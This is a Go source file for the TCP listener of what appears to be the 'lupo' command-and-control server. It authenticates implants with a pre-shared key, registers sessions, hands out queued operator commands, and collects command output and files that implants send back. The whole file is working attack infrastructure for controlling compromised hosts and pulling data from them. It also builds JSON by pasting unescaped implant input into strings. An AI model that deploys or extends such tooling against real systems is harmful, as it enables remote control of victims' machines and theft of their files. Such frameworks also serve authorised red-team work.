package server

import (
	"bufio"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"net"
	"strconv"

	"github.com/InjectionSoftwareandSecurityLLC/lupo/lupo-server/core"
)

// StartTCPServer - starts a tcp server with given parameters specified during Listener creation
func StartTCPServer(tcpServer net.Listener) {
	defer tcpServer.Close()

	for {
		conn, err := tcpServer.Accept()
		if err != nil {
			// Handle additional errors without crashing, such as manually killing a Listener when specified
			if errType, ok := err.(*net.OpError); ok && errType.Op == "accept" {
				break
			}
			log.Println(err)
			continue
		}
		// Using a go routine to handle the connection
		go TCPServerHandler(conn)
	}
}

// TCPServerHandler - handles any incoming TCP connections. Once all values are handled various Implant data update/response routines are executed where relevant based on the provided parameters.
//
// TCP Requests are raw and as a result the TCPServer expects implants to send data in a pre-determined format for parsing.
//
// JSON is the expected format. All JSON values are mapped to a TCPData structure that is then utilized through the handling of the connection. The following parameters can be provided:
//
// PSK - the client Pre-Shared Key that the the implant will send to be compared for authentication to the server PSK
//
// SessionID - a unique Session ID that the implant sends to identify what session it is. This value is supplied to implants by the server after a successful registration.
//
// UUID - a unique UUID formatted identifier that the implant sends to identify what session it is. This value is supplied to implants by the server after a successful registration. The UUID is not the primary identifier but is a secondary validation to prevent id bruteforcing or id mis-matches during the registration/de-registration processes.
//
// ImplantArch - a string for storing the Architecture of an implant's host system. This can be anything and is provided by the implant, but is expected to be something that identifies the host operating system and architecture.
//
// Update - an update interval in seconds that implants provide to tell the server how often it intends to check in. This value is used to determine if a session may have been killed.
//
// Data - a data payload, usually the output of execute commands on the implant. Once an implant executes a command, it can send the output to the data parameter where it will be printed to the user in the Lupo CLI.
//
// AdditionalFunctions - additional function names that can be registered to a given session. These contain a JSON string of {"name":"description"} that is loaded into the CLI if successfully registered. Users can then execute these as unique session sub-commands. It is assumed that the implant has implemented these functions and will execute reserved actions once the registered keyword is received.
//
// Username - a username provided so the handler knows who the request is destined for, defaults to "server" if the implant does not specify in the request.
//
// Register - a boolean value that lets a listener know if an implant is attempting to register itself or not. If not provided registration is assumed to be false. If registration is attempted the listener will check for valid authentication via the PSK and attempt to register a new session.
//
// FileName - a string value provided by an implant that is the filename for a file being sent to download.
//
// File - a string value that is expected to be a base64 encoded string that is a file

func TCPServerHandler(conn net.Conn) {

	defer conn.Close()

	var tcpParams core.TCPData
	var remoteAddr string
	tcpParams.Register = false

	if addr, ok := conn.RemoteAddr().(*net.TCPAddr); ok {
		remoteAddr = addr.IP.String()
	}
	var additionalFunctions map[string]interface{}

	netData, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		errorString := "Error reading TCP connection from implant claiming to be session: " + strconv.Itoa(tcpParams.SessionID)
		core.LogData(errorString)
		core.ErrorColorBold.Println(errorString)
		fmt.Println(err)
		return
	}

	err = json.Unmarshal([]byte(netData), &tcpParams)

	if err != nil {
		core.LogData("error: Problem occurred while parsing input from a TCP based implant")
		core.ErrorColorBold.Println("There was an error with parsing input from a TCP based implant, check the error below:")
		fmt.Println(err)
	}

	if tcpParams.PSK == "" {
		errorString := "TCP Request did not provide PSK, request ignored"
		core.LogData(errorString)
		returnErr := errors.New(errorString)
		ErrorHandler(returnErr)
		return
	}

	if tcpParams.ImplantArch == "" {
		tcpParams.ImplantArch = "Unknown"
	}

	if tcpParams.AdditionalFunctions != "" {
		json.Unmarshal([]byte(tcpParams.AdditionalFunctions), &additionalFunctions)
	} else {
		additionalFunctions = nil
	}

	if tcpParams.Username == "" {
		tcpParams.Username = "server"
	}

	if tcpParams.PSK == PSK {

		if tcpParams.Register == true {

			implant := core.RegisterImplant(tcpParams.ImplantArch, tcpParams.Update, additionalFunctions)

			core.RegisterSession(core.SessionID, "TCP", implant, remoteAddr)

			newSession := core.SessionID - 1

			response := map[string]interface{}{
				"sessionID": newSession,
				"UUID":      implant.ID,
			}

			jsonResp, err := json.Marshal(response)

			if err != nil {
				errorString := "Error converting TCP response to JSON"
				core.LogData(errorString)
				core.ErrorColorBold.Println(errorString)
			}

			conn.Write([]byte(jsonResp))

			core.BroadcastSession(strconv.Itoa(newSession))

			return

		}
	} else {
		errorString := "TCP Request Invalid PSK, request ignored"
		core.LogData(errorString)
		returnErr := errors.New(errorString)
		ErrorHandler(returnErr)
		return
	}

	if core.Sessions[tcpParams.SessionID].Implant.ID != tcpParams.UUID || tcpParams.UUID == core.ZeroedUUID {
		errorString := "TCP Request Invalid UUID, request ignored"
		core.LogData(errorString)
		returnErr := errors.New(errorString)
		ErrorHandler(returnErr)
		return
	}

	if tcpParams.Data != "" {
		core.LogData("Session " + strconv.Itoa(tcpParams.SessionID) + " returned:\n" + tcpParams.Data)
		if tcpParams.Username == "server" {
			fmt.Println("\nSession " + strconv.Itoa(tcpParams.SessionID) + " returned:\n" + tcpParams.Data)
		} else {
			currentWolf := core.Wolves[tcpParams.Username]
			jsonData := `{"data":"` + tcpParams.Data + `"}`
			core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
		}
	}

	if tcpParams.FileName != "" {
		core.LogData("Session " + strconv.Itoa(tcpParams.SessionID) + " returned the file: " + tcpParams.FileName)

		if tcpParams.File == "" {
			core.LogData("Session " + strconv.Itoa(tcpParams.SessionID) + " file contents was empty, no file written for: " + tcpParams.FileName)
			fmt.Println("\nSession " + strconv.Itoa(tcpParams.SessionID) + " file contents was empty, no file written for: " + tcpParams.FileName)
		} else {
			if tcpParams.Username == "server" {
				core.DownloadFile(tcpParams.FileName, tcpParams.File)
			} else {
				currentWolf := core.Wolves[tcpParams.Username]
				jsonData := `{"filename":"` + tcpParams.FileName + `"` + `,"file":"` + tcpParams.File + `"}`
				core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
			}
		}
	}

	var cmd string
	var user string

	if core.Sessions[tcpParams.SessionID].Implant.Commands != nil {
		cmd = core.Sessions[tcpParams.SessionID].Implant.Commands[0].Command
		user = core.Sessions[tcpParams.SessionID].Implant.Commands[0].Operator
	}

	response := map[string]interface{}{
		"user": user,
		"cmd":  cmd,
	}

	jsonResp, err := json.Marshal(response)

	if err != nil {
		errorString := "Error converting TCP cmd to JSON"
		core.LogData(errorString)
		core.ErrorColorBold.Println(errorString)
	}

	core.UpdateImplant(tcpParams.SessionID, tcpParams.Update, additionalFunctions)
	core.SessionCheckIn(tcpParams.SessionID)

	conn.Write([]byte(jsonResp))

}
